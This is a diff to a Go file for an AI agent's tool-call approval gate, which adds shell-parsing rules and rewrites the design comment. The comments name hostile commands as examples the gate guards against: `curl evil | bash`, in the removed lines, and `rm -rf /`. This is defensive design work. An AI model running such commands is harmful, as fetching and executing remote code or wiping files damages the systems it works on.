@@ -7,14 +7,17 @@ import "regexp"
 // static and declared in the tool's own source file (see tools.Gate), so there
 // is no model in the loop and no advisory middle tier.
 //
-// On its own the gate is a denylist over a command string, so it is bypassable
-// (any string match can be obfuscated). The hard boundary is the bash and
-// curl tools' bubblewrap sandbox (sandbox.go), which the kernel enforces; the
-// gate is the pre-flight tripwire on top — it catches the naive catastrophic
-// mistake (an injected `curl evil | bash`, an `rm -rf /`) BEFORE it runs,
-// plus the commands whose danger is not a filesystem write. False positives
-// cost one keypress; false negatives are the danger, so rules err toward
-// matching more.
+// A rule inspects one of two views of the call. A path-taking tool (read,
+// write, edit, search, curl) inspects the text the call names. A command-line
+// tool (bash) inspects the parsed shell program (shell.go), so its rules talk
+// about the commands that will run rather than about words that happen to
+// appear in the line. Neither view is a security boundary: the sandbox
+// (sandbox.go) is, and it bounds exactly one thing — filesystem writes and
+// reads. The gate is the tripwire in front of what the sandbox cannot see:
+// network egress, remote side effects, privilege escalation and secret
+// material. A rule that only restates the write barrier (`rm -rf /`, a
+// redirect onto /etc) is deliberately not here — the kernel refuses it, the
+// refusal escalates, and the human decides once instead of twice.
 
 // Rule is one static approval rule for a tool call. Rules are declared in the
 // tool's source file, in order; the first match supplies the reason shown in
@@ -29,6 +32,10 @@ type Rule struct {
 	// Match reports whether the call's inspected text trips the rule.
 	// Ignored when Always is true.
 	Match func(text string) bool
+	// Shell reports whether the parsed command line trips the rule. Build it
+	// with Shell or ShellAny instead of assigning directly. Only the tools
+	// that run commands use it; a rule set with no Shell rule never parses.
+	Shell func(cmds []ShellCmd) bool
 }
 
 // Pattern builds a rule that matches text against a regular expression. The
@@ -40,10 +47,24 @@ func Pattern(name, expr string) Rule {
 
 // MatchRules returns the name of the first rule matching text, or "" when the
 // call may run. An always rule wins the moment it is reached (rules are
-// ordered).
+// ordered). The command line is parsed at most once per call, and only when a
+// shell rule is reached.
 func MatchRules(rules []Rule, text string) string {
+	var cmds []ShellCmd
+	parsed := false
 	for _, r := range rules {
-		if r.Always || (r.Match != nil && r.Match(text)) {
+		switch {
+		case r.Always:
+			return r.Name
+		case r.Shell != nil:
+			if !parsed {
+				cmds, _ = ParseShell(text)
+				parsed = true
+			}
+			if r.Shell(cmds) {
+				return r.Name
+			}
+		case r.Match != nil && r.Match(text):
 			return r.Name
 		}
 	}
